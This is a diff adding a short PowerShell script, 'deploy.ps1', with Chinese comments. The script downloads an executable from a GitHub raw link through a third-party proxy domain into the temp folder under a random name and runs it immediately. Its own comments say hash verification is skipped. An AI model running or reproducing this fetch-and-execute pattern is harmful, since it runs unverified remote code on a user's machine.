@@ -1,0 +1,33 @@
+# deploy.ps1 - 简化版下载运行脚本
+# 警告：此脚本无安全验证，请确保您完全信任目标文件。
+
+# 用户配置区（请修改这里）
+$原始文件链接 = "https://raw.githubusercontent.com/royckk/RE2/main/down.exe"
+$加速站域名 = "https://g.110777.xyz/"
+$本地文件名 = "down_$([Guid]::NewGuid().ToString(“N”)).exe" # 使用GUID避免重名
+
+# 主逻辑
+$加速后链接 = $加速站域名 + $原始文件链接
+$本地完整路径 = Join-Path $env:TEMP $本地文件名
+
+Write-Host “正在通过加速站下载...” -ForegroundColor Cyan
+Write-Host “目标链接: $加速后链接”
+
+try {
+    # 1. 设置安全协议并下载
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $加速后链接 -OutFile $本地完整路径 -UseBasicParsing
+    Write-Host “下载成功: $本地完整路径” -ForegroundColor Green
+
+    # 2. 直接运行（跳过哈希验证）
+    Write-Host “正在启动程序...” -ForegroundColor Cyan
+    & $本地完整路径
+    Write-Host “程序已启动。” -ForegroundColor Green
+
+} catch {
+    Write-Host “操作失败: $($_.Exception.Message)” -ForegroundColor Red
+    exit 1
+}
+
+# 提示：根据您的需求决定是否保留文件
+# Write-Host “如需清理，请手动删除: $本地完整路径”
